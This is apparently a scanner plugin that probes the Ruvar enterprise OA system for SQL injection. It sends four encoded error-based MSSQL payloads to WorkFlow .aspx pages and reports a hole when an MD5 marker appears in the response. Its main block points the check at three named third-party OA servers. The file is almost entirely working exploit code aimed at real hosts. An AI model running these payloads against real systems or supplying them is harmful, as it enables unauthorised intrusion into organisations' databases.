#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:璐华通用企业版OA系统SQL注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0104430

def assign(service,arg):
    if service=="ruvar_oa":
        return True,arg 
    


def  audit(arg):
    ps=[
       
        "WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%29%3E0--",
        "WorkFlow/wf_work_stat_setting.aspx?template_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
        "WorkFlow/wf_work_form_save.aspx?office_missive_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
        "WorkFlow/wf_get_fields_approve.aspx?template_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
            security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    audit(assign('ruvar_oa','http://oa.gdjierong.com:8090/')[1])
    audit(assign('ruvar_oa','http://oa.mingshiedu.com:801/')[1])
    audit(assign('ruvar_oa','http://oa.pku-ioe.cn/')[1])